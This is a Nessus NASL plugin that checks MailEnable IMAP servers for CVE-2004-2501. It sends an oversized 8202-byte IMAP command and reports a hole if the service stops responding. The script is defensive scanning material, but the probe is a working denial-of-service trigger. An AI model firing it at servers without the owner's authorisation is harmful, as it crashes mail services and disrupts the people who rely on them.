#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(15852);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2004-2501");
  script_bugtraq_id(11755);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"12135");
    script_xref(name:"OSVDB", value:"12136");
  }

  name["english"] = "MailEnable IMAP Service Remote Buffer Overflows";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of MailEnable's IMAP
service.  Two flaws exist in MailEnable Professional Edition 1.52 and
earlier as well as MailEnable Enterprise Edition 1.01 and earlier - a
stack-based buffer overflow and an object pointer overwrite.  A remote
attacker can use either vulnerability to execute arbitrary code on the
target.  More information is available at :

  http://www.hat-squad.com/en/000102.html

Solution : Apply the IMAP hotfix dated 25 November 2004 and found at :

  http://www.mailenable.com/hotfix/default.asp

Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Remote Buffer Overflows in MailEnable's IMAP Service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "global_settings.nasl");
  script_require_ports("Services/imap", 143);
  script_exclude_keys("imap/false_imap");

  exit(0);
}

include("global_settings.inc");

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     connect and send a long command to try to bring down the service 
#     if it looks like it's MailEnable.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
banner = get_kb_item("imap/banner/" + port);
if ("IMAP4rev1 server ready at" >!< banner) exit(0);

# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);

# Send a long command and see if the service crashes.
#
# nb: this tests only for the stack-based buffer overflow; the object
#     pointer overwrite vulnerability reportedly occurs in the same
#     versions so we just assume it's present if the former is.
c = string("a1 ", crap(8202));
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a1 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp='';
}
# If we don't get a response, make sure the service is truly down.
if (!resp) {
  close(soc);
  soc = open_sock_tcp(port);
  if (!soc) {
    security_hole(port);
    exit(0);
  }
}

# Logout.
c = string("a2", " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a2 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
